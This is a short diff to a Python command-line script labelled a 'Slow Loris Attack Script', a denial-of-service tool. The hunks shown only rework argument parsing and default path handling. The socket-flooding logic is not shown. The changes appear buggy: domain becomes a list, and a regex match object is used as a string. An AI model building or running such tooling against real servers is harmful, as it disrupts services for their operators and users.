@@ -5,26 +5,28 @@ import random
 import re
 
 #arg parse stuff
-parser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")
+argparser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")
 
-parser.add_argument("domain", help="Host")
+argparser.add_argument("domain", nargs="*", type=str, help="Host")
 
 #default 0 so the os picks the port
-parser.add_argument("-p", "--port", type=int, default=8080, help="Port")
+argparser.add_argument("-p", "--port", type=int, default=8080, help="Port")
 
-parser.add_argument("-a", "--alivetime", type=int, default=4, help="Keep Alive Time")
+argparser.add_argument("-a", "--alivetime", type=int, default=4, help="Keep Alive Time")
 
-parser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")
+argparser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")
+
+parser = argparser.parse_args()
 
 #if its 1 or less then poop pants
-if len(parser._get_args()) <= 1:
-    parser.print_help()
+if len(sys.argv) <= 1:
+    argparser.print_help()
     sys.exit(1)
 
 #if no domain then poop pants
 if not parser.domain:
     print("need to specify a host")
-    parser.print_help()
+    argparser.print_help()
     sys.exit(1)
 
 
@@ -65,6 +67,9 @@ def sockInit(domain, extension):
 def main():
     #matches the entire string for after the / in the domain
     extension = re.search(r"\/(.+)?", parser.domain)
+    
+    if not extension:
+        extension = "/"
 
     #deletes the extension and then leaves the domain
     domain = parser.domain.replace(extension, "")
